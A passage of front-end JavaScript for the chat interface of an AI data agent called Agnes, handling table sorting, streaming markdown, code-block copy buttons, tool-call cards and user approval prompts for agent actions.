    const headers = [...thead.querySelectorAll("th")];
    headers.forEach((th, idx) => {
      th.setAttribute("role", "button");
      th.setAttribute("tabindex", "0");
      th.setAttribute("aria-sort", "none");
      const label = th.textContent;
      // Wrap the text + indicator so the indicator stays anchored
      // right while the label can ellipsis if a column is narrow.
      // `label` is untrusted (agent- or peer-authored markdown table
      // header) — build the label span via textContent, never
      // interpolate it into an innerHTML template (F3, security.md).
      th.textContent = "";
      const labelSpan = document.createElement("span");
      labelSpan.className = "cloud-chat-th-label";
      labelSpan.textContent = label;
      const arrowSpan = document.createElement("span");
      arrowSpan.className = "cloud-chat-th-arrow";
      arrowSpan.setAttribute("aria-hidden", "true");
      th.appendChild(labelSpan);
      th.appendChild(arrowSpan);
      const sortRows = () => _sortTableByColumn(table, headers, idx);
      th.addEventListener("click", sortRows);
      th.addEventListener("keydown", (e) => {
        if (e.key === "Enter" || e.key === " ") {
          e.preventDefault();
          sortRows();
        }
      });
    });
  }
}

function _sortTableByColumn(table, headers, columnIdx) {
  const tbody = table.querySelector("tbody");
  if (!tbody) return;
  const th = headers[columnIdx];
  const currentDir = th.getAttribute("aria-sort");
  const nextDir = currentDir === "ascending" ? "descending" : "ascending";
  // Reset every other column's state, set this column's.
  headers.forEach(h => h.setAttribute("aria-sort", "none"));
  th.setAttribute("aria-sort", nextDir);

  const rows = [...tbody.querySelectorAll("tr")];
  // Detect numeric column — if every non-empty cell parses as a
  // finite number, sort numerically.
  const cells = rows.map(r => (r.children[columnIdx]?.textContent ?? "").trim());
  const numericVals = cells.map(s => parseFloat(s.replace(/,/g, "")));
  const isNumeric = cells.length > 0 &&
    cells.every((s, i) => s === "" || Number.isFinite(numericVals[i]));
  const cmp = (a, b) => {
    if (isNumeric) {
      const av = parseFloat((a.cellText || "").replace(/,/g, ""));
      const bv = parseFloat((b.cellText || "").replace(/,/g, ""));
      const ax = Number.isFinite(av) ? av : Infinity;
      const bx = Number.isFinite(bv) ? bv : Infinity;
      return ax - bx;
    }
    return (a.cellText || "").localeCompare(b.cellText || "", undefined, { sensitivity: "base" });
  };
  const tagged = rows.map(row => ({
    row,
    cellText: (row.children[columnIdx]?.textContent ?? "").trim(),
  }));
  tagged.sort(cmp);
  if (nextDir === "descending") tagged.reverse();
  // Re-attach in new order — DOM appendChild moves existing nodes.
  for (const { row } of tagged) tbody.appendChild(row);
}

// ---------- Collapsible long messages ------------------------------------
// When an assistant turn renders content taller than COLLAPSE_THRESHOLD
// pixels (typically a long code block or a wide table), we cap the
// body height with a fade-out gradient and surface a "Show more"
// toggle. Keeps the scroll feed scannable; expanded state is per-
// message-element so it doesn't bleed across re-renders.
//
// Why the threshold is this high. The collapse runs at FINALIZE, never
// mid-stream (_renderStreamingMarkdown paints uncapped) — so a body over
// the threshold streams in fully and then snaps shut under a reader who
// was mid-sentence. At the original 480px (~20 lines) that fired on
// nearly every real answer, which made the toggle a "Show more" whose
// only job was to undo a limit we had imposed ourselves — the pattern
// the rail retired on purpose (see rail_history.js). The cap is kept for
// genuine extremes, where an unbounded body would swallow the whole
// viewport and bury the composer, and moved far above the height of an
// ordinary answer.
//
// Must stay equal to the `max-height` on `.msg-bubble.is-collapsible
// .msg-body` in chat.css: this constant decides WHETHER to collapse,
// that declaration decides WHERE the cut lands, and a mismatch clamps a
// body at a height it was never judged against. Pinned by
// tests/test_chat_tool_rendering_ui.py.

const COLLAPSE_THRESHOLD_PX = 2500;

function maybeMakeCollapsible(article) {
  if (!article) return;
  const body = article.querySelector(".msg-body");
  if (!body) return;
  const bubble = article.querySelector(".msg-bubble");
  if (!bubble) return;
  // Run AFTER the next paint so scrollHeight reflects the rendered
  // content. requestAnimationFrame is enough for marked-rendered
  // markdown which doesn't paint async.
  requestAnimationFrame(() => {
    if (body.scrollHeight <= COLLAPSE_THRESHOLD_PX) return;
    bubble.classList.add("is-collapsible");
    if (bubble.querySelector(".msg-toggle-collapse")) return;

    const toggle = document.createElement("button");
    toggle.type = "button";
    toggle.className = "msg-toggle-collapse";
    toggle.textContent = "Show more";
    toggle.onclick = (e) => {
      e.stopPropagation();
      const expanded = bubble.classList.toggle("is-expanded");
      toggle.textContent = expanded ? "Show less" : "Show more";
    };
    // Insert the toggle before the actions row so the actions sit
    // beneath it visually.
    const actions = bubble.querySelector(".msg-actions");
    if (actions) bubble.insertBefore(toggle, actions);
    else bubble.appendChild(toggle);
  });
}

// ---------- Code-block enhancement ---------------------------------------
// Two improvements baked into the same pass over `<pre><code>` blocks:
//
//   1. syntax highlighting via the already-vendored highlight.js — the
//      <link rel="stylesheet" href="/static/vendor/highlight.min.css">
//      in chat.html ships its CSS, and the bundled JS attaches `hljs`
//      on window. We just call `highlightElement` per block after
//      marked.parse() drops the raw HTML in.
//   2. per-block copy buttons — a tiny `.code-block-copy` ghost
//      button absolutely positioned in the top-right of each <pre>,
//      with hover-reveal so it doesn't compete with the code itself.
//
// Safe to call repeatedly: bails out if the block has already been
// processed (data-cb-enhanced attribute).

function enhanceCodeBlocks(root) {
  if (!root) return;
  for (const code of root.querySelectorAll("pre > code")) {
    const pre = code.parentElement;
    if (!pre || pre.dataset.cbEnhanced === "1") continue;
    pre.dataset.cbEnhanced = "1";
    pre.classList.add("code-block-wrap");

    if (window.hljs) {
      try { window.hljs.highlightElement(code); }
      catch (_) { /* unknown language / corrupted markup — fall through */ }
    }

    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = "code-block-copy";
    btn.title = "Copy code";
    btn.setAttribute("aria-label", "Copy code block");
    btn.innerHTML = _COPY_ICON_SVG;
    btn.onclick = async (e) => {
      e.stopPropagation();
      if (await copyTextToClipboard(code.innerText)) {
        btn.classList.add("is-copied");
        setTimeout(() => btn.classList.remove("is-copied"), 1400);
        showToast("Code copied", "ok");
      } else {
        showToast("Couldn't copy code", "error");
      }
    };
    pre.appendChild(btn);
  }
}

// ---------- Smart auto-scroll --------------------------------------------
// We only scroll the chat-messages container down on a new token / new
// turn if the user was already near the bottom — otherwise scrolling
// would yank them away from a paragraph they're actively reading
// further up. `SCROLL_STICK_PX` is the slack zone counted as "near
// bottom" (8 lines or so).

const SCROLL_STICK_PX = 120;

function isNearBottom(el) {
  if (!el) return true;
  return el.scrollHeight - el.scrollTop - el.clientHeight < SCROLL_STICK_PX;
}

function maybeScrollToBottom() {
  const el = $("chat-messages");
  if (!el) return;
  // Capture stickiness BEFORE the next paint. The caller has already
  // appended the new node so scrollHeight has grown; we approximate
  // "was near bottom" by comparing post-append minus the typical
  // bubble height (~80px). Conservative: if uncertain, scroll.
  if (el.scrollHeight - el.scrollTop - el.clientHeight < SCROLL_STICK_PX + 200) {
    el.scrollTop = el.scrollHeight;
  }
}

// ---------- "Agnes is thinking…" placeholder -----------------------------
// Rendered the moment the user submits, removed as soon as the first
// server frame (token / tool_call / assistant_message) arrives. Bridges
// the gap between "I sent a message" and "the agent has started".

let thinkingEl = null;

function showThinkingPlaceholder() {
  if (thinkingEl) return;
  thinkingEl = createMessageShell({ role: "assistant" });
  thinkingEl.classList.add("is-thinking");
  const body = thinkingEl.querySelector(".msg-body");
  body.innerHTML =
    '<span class="msg-thinking-dot"></span>' +
    '<span class="msg-thinking-dot"></span>' +
    '<span class="msg-thinking-dot"></span>';
  $("chat-messages").appendChild(thinkingEl);
  maybeScrollToBottom();
}

function clearThinkingPlaceholder() {
  if (!thinkingEl) return;
  thinkingEl.remove();
  thinkingEl = null;
}

// Streaming state — captured per turn so finalize knows what to
// re-render and what raw text to hand the copy button.
// `currentAssistantText` holds the CURRENT SEGMENT only: a tool/approval/
// question block seals the streaming bubble (#1504 — the transcript must
// keep the frame order, text → block → text, instead of one pre-block
// bubble swallowing everything), and the sealed segments accumulate in
// `_turnSealedText` so finalize can subtract what is already on screen.
let currentAssistantArticle = null;
let currentAssistantBody = null;
let currentAssistantText = "";
let _turnSealedText = "";
let _turnSealedArticles = [];

// ---------- Streaming markdown ---------------------------------------------
// Tokens used to append as plain textContent, so the reader watched raw
// `**bold**` and `|table|` source until turn end. Now the accumulated text is
// re-rendered through renderAnswerMarkdown at most once per _STREAM_RENDER_MS.
// Cheap by construction: marked on a few KB of text; the heavy enhancement
// passes (highlight.js, mermaid, sort, copy buttons) still run only at
// finalize, on the final content.
const _STREAM_RENDER_MS = 150;
let _streamRenderTimer = null;
let _streamLastRender = 0;

/** What of the accumulated text is safe to paint mid-stream. A trailing fence
 *  that is still open is hidden while (a) its language id is still being
 *  typed (no newline yet), or (b) the id is a prefix of a wire trailer
 *  (`sources` / `next_actions`) — those are lifted out at finalize and must
 *  never flash on screen. An open fence with a real language and a body keeps
 *  rendering: marked shows it as a growing code block, which is the desired
 *  behavior for streaming code. */
function _streamingSafeText(text) {
  const t = text || "";
  // Walk the ``` delimiters from the START, pairing openers with closers —
  // fence parity. Reading only the LAST ``` mistook a trailer's just-arrived
  // CLOSING fence for a fresh opener: the chop at that point handed the
  // renderer an UNTERMINATED trailer, which the strip helpers deliberately
  // keep (an unterminated opener is not a block), so the wire format flashed
  // on screen until the next repaint. With parity, a closed trailer passes
  // through whole and renderAnswerMarkdown strips the complete block; an
  // OPEN trailer is withheld from its own opener.
  let i = 0;
  let openAt = -1; // index of the currently-open fence's ```; -1 = none open
  let openLang = null; // its language id; null = id still streaming (no newline yet)
  for (;;) {
    const f = t.indexOf("```", i);
    if (f === -1) break;
    if (openAt === -1) {
      openAt = f;
      const nl = t.indexOf("\n", f + 3);
      openLang = nl === -1 ? null : t.slice(f + 3, nl).trim().toLowerCase();
    } else {
      openAt = -1;
      openLang = null;
    }
    i = f + 3;
  }
  if (openAt === -1) return t; // every fence is closed
  if (openLang === null) return t.slice(0, openAt); // language id still streaming
  if (openLang && ("sources".startsWith(openLang) || "next_actions".startsWith(openLang))) {
    return t.slice(0, openAt);
  }
  return t;
}

function _scheduleStreamRender() {
  const now = performance.now();
  const since = now - _streamLastRender;
  if (since >= _STREAM_RENDER_MS) {
    _renderStreamingMarkdown();
    return;
  }
  if (_streamRenderTimer) return;
  _streamRenderTimer = setTimeout(_renderStreamingMarkdown, _STREAM_RENDER_MS - since);
}

function _renderStreamingMarkdown() {
  if (_streamRenderTimer) {
    clearTimeout(_streamRenderTimer);
    _streamRenderTimer = null;
  }
  _streamLastRender = performance.now();
  if (!currentAssistantBody) return; // finalized (or never started) — nothing to paint
  const visible = _streamingSafeText(currentAssistantText);
  if (currentAssistantArticle) {
    currentAssistantArticle.classList.toggle("is-trailing", _inWithheldTrailer(currentAssistantText));
  }
  try {
    currentAssistantBody.innerHTML = renderAnswerMarkdown(visible);
  } catch (_e) {
    currentAssistantBody.textContent = visible;
  }
  maybeScrollToBottom();
}

/** Repaint the streaming bubble with the FULL accumulated text. The live
 *  painter withholds a trailing half-fence (_streamingSafeText); that is only
 *  correct while more of the stream is coming, and a half-open fence shown
 *  raw is honest about where the turn died. The turn-stopping frames
 *  (cancelled / confirmation_required / error) may be the turn's last word —
 *  a trailing assistant_message is common (graceful interrupt, the watchdog's
 *  partial-save emits error THEN the partial assistant_message, the budget
 *  stop breaks out into the turn's trailing emit) but NOT guaranteed — so
 *  each flushes the withheld tail here. The stream pointers stay set on
 *  purpose: when the trailing assistant_message DOES arrive,
 *  finalizeAssistantMessage must land in this same bubble, not render a
 *  duplicate next to it. */
function _flushStreamingTail() {
  if (_streamRenderTimer) {
    clearTimeout(_streamRenderTimer);
    _streamRenderTimer = null;
  }
  if (!currentAssistantBody) return;
  try {
    currentAssistantBody.innerHTML = renderAnswerMarkdown(currentAssistantText);
  } catch (_e) {
    currentAssistantBody.textContent = currentAssistantText;
  }
}

/** Close out a streamed bubble that never got its assistant_message — flush
 *  the tail, drop the pointers (so the NEXT turn's tokens start a fresh
 *  bubble instead of appending into this one after its stale text), and give
 *  the orphan the same finishing tail finalize gives a normal answer:
 *  highlighted code, sortable tables, mermaid, chips from a completed
 *  trailer, the copy/actions row, latest-assistant marking. Sources chips
 *  are deliberately absent — they render the SERVER's verdict, and a turn
 *  that never finalized has none. Runs on `done` (the turn terminator,
 *  always after any assistant_message), on a conversation switch
 *  (openSession), and again defensively on the next submit (a hard-crashed
 *  turn may never even get a done); all are no-ops after a normal finalize
 *  because the pointers are already null, so nothing double-attaches. */
function _resetStreamingState() {
  _flushStreamingTail();
  const article = currentAssistantArticle;
  const body = currentAssistantBody;
  const text = currentAssistantText;
  currentAssistantArticle = null;
  currentAssistantBody = null;
  currentAssistantText = "";
  // Sealed segments are already finished on screen — an orphan turn keeps
  // them as they stand; only the bookkeeping resets so the next turn's
  // finalize doesn't subtract THIS turn's text.
  _turnSealedText = "";
  _turnSealedArticles = [];
  if (!article || !body) return;
  article.classList.remove("is-streaming", "is-trailing");
  if (!text.trim()) return; // an empty bubble has nothing to finish
  enhanceCodeBlocks(body);
  enhanceTables(body);
  renderMermaidBlocks(body);
  renderNextActions(body.closest(".msg-bubble"), extractNextActions(text).actions);
  attachMessageActions(article, stripNextActionsFence(text));
  _markLatestAssistant(article);
  maybeMakeCollapsible(article);
}

/** Seal the streaming bubble at an inline block boundary (tool card,
 *  approval card, question card). The block is about to be appended AFTER
 *  the bubble, and any text still to come belongs BELOW the block — so the
 *  bubble is finished as it stands (full segment flush + the light
 *  enhancement passes; no actions row, chips or latest-marking — those
 *  belong to the turn's LAST bubble, at finalize) and the pointers drop so
 *  the next token opens a fresh bubble under the block. Frame order IS the
 *  turn order (#1504); this keeps the transcript telling it. No-op when
 *  nothing has streamed yet, so back-to-back tool calls seal once. */
function _sealStreamingSegment() {
  if (!currentAssistantArticle || !currentAssistantBody) return;
  if (!currentAssistantText.trim()) {
    // An empty bubble (token frame raced ahead with only whitespace) —
    // drop it rather than sealing a blank paragraph above the block.
    currentAssistantArticle.remove();
  } else {
    _flushStreamingTail();
    currentAssistantArticle.classList.remove("is-streaming", "is-trailing");
    enhanceCodeBlocks(currentAssistantBody);
    enhanceTables(currentAssistantBody);
    renderMermaidBlocks(currentAssistantBody);
    // Exact concatenation, no separator: finalize's content is the plain
    // join of every streamed delta, and the subtraction below relies on it.
    _turnSealedText += currentAssistantText;
    _turnSealedArticles.push(currentAssistantArticle);
  }
  currentAssistantArticle = null;
  currentAssistantBody = null;
  currentAssistantText = "";
}

function appendToken(text) {
  clearThinkingPlaceholder();
  if (!currentAssistantArticle) {
    currentAssistantArticle = createMessageShell({ role: "assistant" });
    currentAssistantArticle.classList.add("is-streaming");
    currentAssistantBody = currentAssistantArticle.querySelector(".msg-body");
    currentAssistantText = "";
    $("chat-messages").appendChild(currentAssistantArticle);
  }
  currentAssistantText += text;
  _scheduleStreamRender();
}

function finalizeAssistantMessage(frame) {
  // A tick scheduled mid-stream must not fire after the final render below —
  // clear it first; _renderStreamingMarkdown's currentAssistantBody guard is
  // the second line of defense.
  if (_streamRenderTimer) {
    clearTimeout(_streamRenderTimer);
    _streamRenderTimer = null;
  }
  clearThinkingPlaceholder();
  // A completed assistant message is a successful answer — advance the
  // journey counter (errors arrive on the separate "error" frame).
  onboardingNoteAnswered();
  const content = (frame && frame.content) || _turnSealedText + currentAssistantText;
  // Which text this bubble paints depends on whether the turn was SEGMENTED
  // (#1504 — an inline block sealed at least one earlier bubble).
  //
  // Unsegmented: repaint from the server's `content`. It is the authoritative
  // record (a partial-save or a rewrite lands there) and there is nothing on
  // screen it could contradict.
  //
  // Segmented: paint the locally accumulated tail instead, and leave the
  // sealed bubbles alone. `content` is NOT a concatenation of the deltas —
  // the engine provider builds it as `"\n\n".join(part.strip() …)` over text
  // parts (`_TurnState.text`), and the native runner likewise consolidates
  // TextBlocks — so subtracting a "sealed prefix" from it only works while a
  // turn happens to have a single text part. On a real multi-part turn the
  // arithmetic misses, and any fallback that then re-renders `content` whole
  // resurrects the exact bug this segmentation fixes: all the text below all
  // the cards. The deltas the client actually displayed are the one source
  // that is guaranteed ordered and complete, so display is derived from them
  // and `content` is used only as the RECORD — the copy row and the
  // next-actions/sources trailers below all still read from it.
  const segmented = _turnSealedArticles.length > 0;
  const tail = segmented ? currentAssistantText : content;
  // No trailing text after the last block: the last sealed bubble is the
  // answer's end — chips, sources and the copy row (carrying the FULL
  // content) land there instead of on a phantom empty bubble.
  if (!currentAssistantArticle && !tail.trim() && segmented) {
    const article = _turnSealedArticles[_turnSealedArticles.length - 1];
    const bubble = article.querySelector(".msg-bubble");
    renderSourcesChips(bubble, frame && frame.sources);
    renderNextActions(bubble, extractNextActions(content).actions);
    renderFactsScopeLine(bubble);
    attachMessageActions(article, stripNextActionsFence(content));
    _markLatestAssistant(article);
    // Every other finish path caps an over-long answer; this one must too, or
    // a turn that ends on a tool card leaves its final segment uncapped.
    maybeMakeCollapsible(article);
    _turnSealedText = "";
    _turnSealedArticles = [];
    maybeScrollToBottom();
    return;
  }
  _turnSealedText = "";
  _turnSealedArticles = [];
  if (currentAssistantArticle && currentAssistantBody) {
    currentAssistantArticle.classList.remove("is-streaming", "is-trailing");
    currentAssistantBody.innerHTML = renderAnswerMarkdown(tail);
    enhanceCodeBlocks(currentAssistantBody);
    enhanceTables(currentAssistantBody);
    renderMermaidBlocks(currentAssistantBody);
    // The live turn and a later reload must agree, so both read the SERVER's
    // verdict — stamped onto this frame before the fan-out and recomputed
    // identically by GET /sessions/{id}/messages.
    renderSourcesChips(currentAssistantBody.closest(".msg-bubble"), frame && frame.sources);
    renderNextActions(currentAssistantBody.closest(".msg-bubble"), extractNextActions(content).actions);
    renderFactsScopeLine(currentAssistantBody.closest(".msg-bubble"));
    // The copy row hands over the WHOLE answer — the bubble shows the tail,
    // but nobody copying "the answer" wants it cut at the last tool card.
    attachMessageActions(currentAssistantArticle, stripNextActionsFence(content));
    _markLatestAssistant(currentAssistantArticle);
    maybeMakeCollapsible(currentAssistantArticle);
    currentAssistantArticle = null;
    currentAssistantBody = null;
    currentAssistantText = "";
    maybeScrollToBottom();
  } else {
    renderMessage({
      role: "assistant",
      // `tail`, not `content` — with sealed segments on screen the full
      // content would render them a second time (tail === content otherwise).
      content: tail,
      tool_calls: frame && frame.tool_calls,
      sources: frame && frame.sources,
      created_at: new Date().toISOString(),
    });
    // This fallback path (no streamed article — e.g. a tokenless turn) must
    // end in the same state as the streamed one: chips under the answer.
    // renderMessage marked it latest-assistant and stripped the trailer.
    if (lastAssistantArticle) {
      const bubble = lastAssistantArticle.querySelector(".msg-bubble");
      renderNextActions(bubble, extractNextActions(content).actions);
      renderFactsScopeLine(bubble);
    } else {
      // No bubble to attach the line to (renderMessage found nothing) — the
      // tally must still not bleed into the next turn.
      _resetFactsTurnEvidence();
    }
  }
}

// ---------- Inline tool-call blocks --------------------------------------
// Each tool call renders as a self-contained block in the message stream,
// COLLAPSED to its header line by default:
//
//   ┌─ ⏳ run_query ························ args · running… ›┐   header only
//   ┌─ ✓ run_query ····························· args · 1.2s ›┐   header only
//
// Clicking the header expands the card:
//
//   ├─ ✓ run_query · 1.2s ······································┤
//   │   ARGS    <formatted, highlighted JSON>                   │
//   │   RESULT  <first N rows as a real table, markdown, or     │
//   │            formatted, highlighted JSON>                   │
//   └────────────────────────────────────────────────────────────┘
//
// The card header is the one click — args and result render directly in
// the body, no nested toggles (only oversize payloads keep a "show all"
// route). Tabular results (`agnes catalog`, `agnes query`,
// `agnes describe`) get a real <table>; markdown-ish strings render as
// markdown; everything else is pretty-printed JSON. A FAILED call opens
// itself — its output is the diagnosis.
//
// Status icons (Lucide sprite, see chat_icons.js): hourglass = running,
// check = done, triangle-alert = error. The status class on the wrapper
// tints the left border accordingly so a failed tool call is unmistakable
// at a glance.

const _TOOL_RESULT_PREVIEW_ROWS = 5;
const _TOOL_RESULT_TEXT_PREVIEW_CHARS = 280;
const _TOOL_JSON_PREVIEW_CHARS = 4000;

/** A labeled, syntax-highlighted JSON block for a card body. `language-json`
 *  pins hljs's detection — auto-detect misreads short payloads — and the
 *  shared enhanceCodeBlocks pass adds the dark chrome + copy button.
 *  Payloads over _TOOL_JSON_PREVIEW_CHARS render capped, with the whole
 *  thing one toggle away, filled lazily on first open (same idiom as the
 *  table preview's raw-JSON route). */
function _jsonPanel(label, value, className) {
  const panel = document.createElement("div");
  panel.className = className;
  const lab = document.createElement("div");
  lab.className = "cloud-chat-tool-panel-label";
  lab.textContent = label;
  panel.appendChild(lab);
  const text = JSON.stringify(value, null, 2) ?? String(value);
  const pre = document.createElement("pre");
  const code = document.createElement("code");
  code.className = "language-json";
  code.textContent = text.length > _TOOL_JSON_PREVIEW_CHARS
    ? text.slice(0, _TOOL_JSON_PREVIEW_CHARS) + "\n…"
    : text;
  pre.appendChild(code);
  panel.appendChild(pre);
  if (text.length > _TOOL_JSON_PREVIEW_CHARS) {
    const det = document.createElement("details");
    det.className = "cloud-chat-tool-result-full";
    const sum = document.createElement("summary");
    sum.textContent = `Show all (${text.length.toLocaleString()} chars)`;
    det.appendChild(sum);
    const fullPre = document.createElement("pre");
    const fullCode = document.createElement("code");
    fullPre.appendChild(fullCode);
    det.appendChild(fullPre);
    let filled = false;
    det.addEventListener("toggle", () => {
      if (!det.open || filled) return;
      filled = true;
      fullCode.textContent = text;
    });
    panel.appendChild(det);
  }
  enhanceCodeBlocks(panel);
  return panel;
}

function _toolCallId(frame) {
  // Pair tool_call ↔ tool_result via the runner's dedicated tool_use_id:
  // frame.id is NOT usable — the server's frame envelope overwrites it
  // with "chat_id:seq", which differs between the call and result frames,
  // so pairing on it left every tool block stuck on "running…" forever.
  // Fall back to id (pre-envelope runners) then tool name.
  return frame.tool_use_id || frame.id || frame.tool;
}

function _summarizeArgs(args) {
  if (args == null) return "";
  if (typeof args === "string") return args.length > 80 ? args.slice(0, 78) + "…" : args;
  if (typeof args !== "object") return String(args);
  const keys = Object.keys(args);
  if (keys.length === 0) return "";
  // Heuristic: prefer the SQL arg if present (run_query, agnes query)
  // — that's what the user actually wants to see. Otherwise show the
  // first scalar value or a "k=v, k=v" sketch.
  if (typeof args.command === "string") {
    const cmd = args.command.replace(/\s+/g, " ").trim();
    return cmd.length > 100 ? cmd.slice(0, 98) + "…" : cmd;
  }
  if (typeof args.sql === "string") {
    const sql = args.sql.replace(/\s+/g, " ").trim();
    return sql.length > 100 ? sql.slice(0, 98) + "…" : sql;
  }
  if (typeof args.table === "string") return args.table;
  if (typeof args.name === "string") return args.name;
  const parts = [];
  for (const k of keys.slice(0, 3)) {
    const v = args[k];
    if (v == null) continue;
    const text = typeof v === "object" ? JSON.stringify(v) : String(v);
    parts.push(`${k}=${text.length > 30 ? text.slice(0, 28) + "…" : text}`);
  }
  return parts.join(", ");
}

// ---------- Tool labels -----------------------------------------------------
// The header of a tool block shows a reader-facing verb, not a tool id. Three
// layers: (1) the agent does most data work through the agnes CLI inside
// Bash, so for Bash the COMMAND LINE is what names the action — first
// matching prefix wins; (2) exact names for the harness builtins; (3) an
// unknown tool is humanized (mcp prefix off, underscores to spaces), so raw
// JSON-ish ids never headline a block. The raw id stays in the tooltip and
// the args panel.
const _TOOL_LABELS = {
  Bash: "Running a command",
  Read: "Reading a file",
  Write: "Writing a file",
  Edit: "Editing a file",
  Glob: "Listing files",
  Grep: "Searching files",
  Task: "Delegating to a subagent",
  WebSearch: "Searching the web",
  WebFetch: "Fetching a page",
  TodoWrite: "Planning steps",
  // Fact graph over Collections (design doc §13.2 "Chat") — the same
  // "raw tool id -> human head" precedent as everything else in this table;
  // `fact_claims` additionally gets a bespoke RESULT preview instead of the
  // generic JSON/table fallback (see _renderFactClaimsPreview below).
  fact_search: "Searched the knowledge graph",
  fact_neighbors: "Walked related facts",
  fact_claims: "Read the evidence",
  // Track C7 (@delegation MVP) — the in-sandbox SDK tool
  // `app/chat/runner.py::_delegation_mcp_server` exposes as
  // `mcp__agnes-delegation__delegate_to_agent`; `_plainToolName` strips
  // the `mcp__<server>__` prefix down to `delegate_to_agent`. No new
  // frame types were introduced (delegation rides the existing generic
  // tool_call/tool_result pair, already AG-UI-mapped) — this label is
  // the whole of the "agent badge" for this MVP.
  delegate_to_agent: "Delegating to another agent",
};

const _BASH_COMMAND_LABELS = [
  ["agnes catalog", "Reading the data catalog"],
  ["agnes schema", "Reading a table schema"],
  ["agnes describe", "Sampling table rows"],
  ["agnes query", "Querying data"],
  ["agnes snapshot", "Snapshotting remote data"],
  ["agnes stack", "Browsing data packages"],
  ["agnes pull", "Syncing data"],
  ["python", "Running Python"],
];

/** `mcp__<server>__<tool>` → `<tool>`; anything else unchanged. */
function _plainToolName(tool) {
  const m = /^mcp__.+?__(.+)$/.exec(tool || "");
  return m ? m[1] : tool || "";
}

function _toolLabel(tool, args) {
  const bare = _plainToolName(tool);
  if (bare === "Bash") {
    const cmd = args && typeof args.command === "string" ? args.command.trim() : "";
    for (const [prefix, label] of _BASH_COMMAND_LABELS) {
      if (cmd.startsWith(prefix)) return label;
    }
    return _TOOL_LABELS.Bash;
  }
  if (Object.prototype.hasOwnProperty.call(_TOOL_LABELS, bare)) return _TOOL_LABELS[bare];
  const words = bare.replace(/[_-]+/g, " ").trim();
  if (!words) return "tool";
  return words.charAt(0).toUpperCase() + words.slice(1);
}

function renderApprovalRequest(frame) {
  if (!frame.request_id) return;
  // Answered stays answered — check BEFORE arming the pending map, or a
  // replayed request re-arms a card the user already dealt with and it
  // comes back looking like it still needs a decision.
  if (answeredApprovalIds.has(frame.request_id)) return;
  // Replay dedup: a mid-turn reconnect re-delivers the request frame.
  if (document.querySelector(`[data-approval-id="${CSS.escape(frame.request_id)}"]`)) return;
  pendingApprovalFrames.set(frame.request_id, frame);
  clearThinkingPlaceholder();
  _sealStreamingSegment();
  const wrap = document.createElement("section");
  wrap.className = "cloud-chat-tool cloud-chat-approval is-running";
  wrap.dataset.approvalId = frame.request_id;

  const head = document.createElement("div");
  head.className = "cloud-chat-tool-head";
  const icon = document.createElement("span");
  icon.className = "cloud-chat-tool-icon";
  icon.setAttribute("aria-hidden", "true");
  icon.appendChild(iconEl("shield"));
  head.appendChild(icon);
  const name = document.createElement("span");
  name.className = "cloud-chat-tool-name";
  // Name the tool being approved — the frame carries it ("tool" is the
  // engine provider's nothing-known fallback, not a name worth showing).
  const approvalTool = typeof frame.tool === "string" && frame.tool !== "tool" ? frame.tool : "";
  name.textContent = approvalTool
    ? `Approval required · ${_toolLabel(approvalTool, { command: frame.command })}`
    : "Approval required";
  name.title = approvalTool;
  head.appendChild(name);
  const summary = document.createElement("span");
  summary.className = "cloud-chat-tool-summary";
  summary.textContent = frame.reason || "";
  head.appendChild(summary);
  wrap.appendChild(head);

  // The engine provider sends tool args as a JSON string; a no-args call
  // used to arrive as "{}" and render as a code block saying nothing.
  let cmdText = typeof frame.command === "string" ? frame.command.trim() : "";
  if (cmdText === "{}") cmdText = "";
  if (cmdText) {
    try {
      // One-line JSON args (older frames replayed from a reconnect) →
      // pretty-printed. Anything unparsable — a shell command from the
      // native runner, a truncated payload — renders verbatim.
      const parsed = JSON.parse(cmdText);
      if (parsed && typeof parsed === "object") cmdText = JSON.stringify(parsed, null, 2);
    } catch {
      /* not JSON — keep as-is */
    }
    const pre = document.createElement("pre");
    pre.className = "cloud-chat-approval-cmd";
    const code = document.createElement("code");
    code.textContent = cmdText;
    pre.appendChild(code);
    wrap.appendChild(pre);
  }

  // The engine's approval request_id IS the toolCallId, so when the tool
  // card for this call is already on screen it claims "running…" while the
  // tool is actually parked on this decision — say so. (Native-runner ids
  // are unrelated to tool ids; the lookup just misses there.)
  const inflightCard = inFlightToolCalls.get(frame.request_id);
  if (inflightCard) {
    const meta = inflightCard.querySelector(".cloud-chat-tool-meta");
    if (meta) meta.textContent = "waiting for approval";
  }

  const actions = document.createElement("div");
  actions.className = "cloud-chat-approval-actions";
  const mkBtn = (label, decision, cls) => {
    const b = document.createElement("button");
    b.type = "button";
    b.className = `cloud-chat-approval-btn ${cls}`;
    b.textContent = label;
    b.onclick = () => {
      // Only disable the buttons once the decision is actually on the wire.
      // If the socket is down/reconnecting, ws?.send() would silently no-op
      // while the buttons still greyed out — the card would freeze with
      // nothing sent, and the pending approval would sit until it times out.
      // Keep them clickable and tell the user to retry (review finding #1145).
      if (!ws || ws.readyState !== WebSocket.OPEN) {
        setStatus("Not connected — reconnecting. Try the approval again in a moment.", "warn");
        return;
      }
      ws.send(
        JSON.stringify({ type: "approval_decision", request_id: frame.request_id, decision })
      );
      actions.querySelectorAll("button").forEach((x) => {
        x.disabled = true;
      });
    };
    return b;
  };
  actions.appendChild(mkBtn("Allow once", "allow", "is-allow"));
  actions.appendChild(mkBtn("Allow for session", "allow_session", "is-allow"));
  actions.appendChild(mkBtn("Deny", "deny", "is-deny"));
  wrap.appendChild(actions);

  $("chat-messages").appendChild(wrap);
  maybeScrollToBottom();
}

function resolveApprovalCard(frame) {
  if (frame.request_id) {
    pendingApprovalFrames.delete(frame.request_id);
    answeredApprovalIds.add(frame.request_id);
  }
  // Undo renderApprovalRequest's "waiting for approval" on the matching
  // tool card: the call either resumes (allow) or is about to land its
  // error result, which overwrites the meta anyway.
  const inflightCard = frame.request_id ? inFlightToolCalls.get(frame.request_id) : null;
  if (inflightCard) {
    const meta = inflightCard.querySelector(".cloud-chat-tool-meta");
    if (meta) meta.textContent = "running…";
  }
  const el = frame.request_id
    ? document.querySelector(`[data-approval-id="${CSS.escape(frame.request_id)}"]`)
    : null;
  if (!el) return;
  el.classList.remove("is-running");
  const labels = {
    allow: "Allowed once",
    allow_session: "Allowed for session",
    deny: "Denied",
    timeout: "Timed out",
  };
  const allowed = frame.decision === "allow" || frame.decision === "allow_session";
  const actions = el.querySelector(".cloud-chat-approval-actions");
  if (actions) {
    actions.textContent = "";
    const badge = document.createElement("span");
    badge.className = "cloud-chat-approval-outcome " + (allowed ? "is-allow" : "is-deny");
    badge.textContent = labels[frame.decision] || frame.decision || "resolved";
